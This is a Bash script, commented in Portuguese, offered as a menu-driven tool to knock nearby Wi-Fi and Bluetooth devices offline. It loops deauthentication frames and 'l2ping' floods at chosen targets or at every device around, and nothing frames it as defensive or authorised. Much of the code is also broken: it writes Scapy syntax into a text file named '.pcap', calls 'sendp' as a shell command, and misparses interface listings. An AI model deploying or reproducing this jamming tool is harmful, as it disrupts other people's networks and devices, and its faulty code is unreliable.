#!/bin/bash

# Função para realizar o flood de desconexão Wi-Fi
function flood_deauth_wifi() {
    target_mac=$1
    iface=$2

    # Cria um pacote de deauth usando o endereço MAC de destino e a interface de rede
    packet="deauth_packet.pcap"
    echo -e "RadioTap()\nDot11(type=0, subtype=12, addr1='$target_mac')/Dot11Deauth()" > $packet

    # Envia o pacote continuamente
    while true; do
        sudo sendp -i $iface -c 100 $packet >/dev/null 2>&1
    done
}

# Função para realizar o flood de desconexão Bluetooth
function flood_deauth_bluetooth() {
    target_mac=$1

    # Conecta ao dispositivo Bluetooth e desconecta
    while true; do
        sudo l2ping -i hci0 -f $target_mac >/dev/null 2>&1
    done
}

# Função para exibir os dispositivos disponíveis
function exibir_dispositivos() {
    if [ "$1" == "wifi" ]; then
        echo "Dispositivos Wi-Fi:"
        sudo iw dev | awk '$1=="Interface"{print $2}'
    elif [ "$1" == "bluetooth" ]; then
        echo "Dispositivos Bluetooth:"
        sudo hciconfig | awk '$1=="hci"{print $1}'
    fi
}

# Função para selecionar dispositivos específicos ou todos ao redor
function selecionar_dispositivos() {
    dispositivos=()
    if [ "$1" == "wifi" ]; then
        exibir_dispositivos "wifi"
        while true; do
            read -p "Digite o número do dispositivo para adicionar à lista (ou 'todos' para selecionar todos): " dispositivo
            if [ "$dispositivo" == "todos" ]; then
                dispositivos=("todos")
                break
            elif [ -z "$dispositivo" ]; then
                echo "Número inválido. Tente novamente."
            else
                dispositivos+=("$dispositivo")
            fi
        done
    elif [ "$1" == "bluetooth" ]; then
        exibir_dispositivos "bluetooth"
        while true; do
            read -p "Digite o número do dispositivo para adicionar à lista (ou 'todos' para selecionar todos): " dispositivo
            if [ "$dispositivo" == "todos" ]; then
                dispositivos=("todos")
                break
            elif [ -z "$dispositivo" ]; then
                echo "Número inválido. Tente novamente."
            else
                dispositivos+=("$dispositivo")
            fi
        done
    fi
    echo "${dispositivos[@]}"
}

# Função principal
function main() {
    while true; do
        echo "----- Menu de Flood de Desconexão -----"
        echo "1. Flood de Desconexão Wi-Fi"
        echo "2. Flood de Desconexão Bluetooth"
        echo "3. Flood de Desconexão Wi-Fi e Bluetooth"
        echo "0. Sair"
        read -p "Escolha uma opção: " opcao

        case $opcao in
            1)
                echo "----- Opção: Flood de Desconexão Wi-Fi -----"
                dispositivos=$(selecionar_dispositivos "wifi")
                if [ ${#dispositivos[@]} -eq 0 ]; then
                    echo "Nenhum dispositivo selecionado. Voltando ao menu principal."
                    continue
                fi
                for dispositivo in ${dispositivos[@]}; do
                    if [ "$dispositivo" == "todos" ]; then
                        iface=$(exibir_dispositivos "wifi" | awk '{print $1}')
                        flood_deauth_wifi "ff:ff:ff:ff:ff:ff" $iface &
                    else
                        iface=$(exibir_dispositivos "wifi" | awk "NR==$dispositivo" | awk '{print $1}')
                        target_mac=$(exibir_dispositivos "wifi" | awk "NR==$dispositivo" | awk '{print $2}')
                        flood_deauth_wifi $target_mac $iface &
                    fi
                done
                ;;
            2)
                echo "----- Opção: Flood de Desconexão Bluetooth -----"
                dispositivos=$(selecionar_dispositivos "bluetooth")
                if [ ${#dispositivos[@]} -eq 0 ]; then
                    echo "Nenhum dispositivo selecionado. Voltando ao menu principal."
                    continue
                fi
                for dispositivo in ${dispositivos[@]}; do
                    if [ "$dispositivo" == "todos" ]; then
                        flood_deauth_bluetooth "ff:ff:ff:ff:ff:ff" &
                    else
                        target_mac=$(exibir_dispositivos "bluetooth" | awk "NR==$dispositivo" | awk '{print $2}')
                        flood_deauth_bluetooth $target_mac &
                    fi
                done
                ;;
            3)
                echo "----- Opção: Flood de Desconexão Wi-Fi e Bluetooth -----"
                dispositivos_wifi=$(selecionar_dispositivos "wifi")
                dispositivos_bluetooth=$(selecionar_dispositivos "bluetooth")

                if [ ${#dispositivos_wifi[@]} -eq 0 ] && [ ${#dispositivos_bluetooth[@]} -eq 0 ]; then
                    echo "Nenhum dispositivo selecionado. Voltando ao menu principal."
                    continue
                fi

                for dispositivo in ${dispositivos_wifi[@]}; do
                    if [ "$dispositivo" == "todos" ]; then
                        iface=$(exibir_dispositivos "wifi" | awk '{print $1}')
                        flood_deauth_wifi "ff:ff:ff:ff:ff:ff" $iface &
                    else
                        iface=$(exibir_dispositivos "wifi" | awk "NR==$dispositivo" | awk '{print $1}')
                        target_mac=$(exibir_dispositivos "wifi" | awk "NR==$dispositivo" | awk '{print $2}')
                        flood_deauth_wifi $target_mac $iface &
                    fi
                done

                for dispositivo in ${dispositivos_bluetooth[@]}; do
                    if [ "$dispositivo" == "todos" ]; then
                        flood_deauth_bluetooth "ff:ff:ff:ff:ff:ff" &
                    else
                        target_mac=$(exibir_dispositivos "bluetooth" | awk "NR==$dispositivo" | awk '{print $2}')
                        flood_deauth_bluetooth $target_mac &
                    fi
                done
                ;;
            0)
                echo "Encerrando o programa..."
                exit 0
                ;;
            *)
                echo "Opção inválida. Por favor, escolha uma opção válida."
                ;;
        esac
    done
}

# Executa a função principal
main
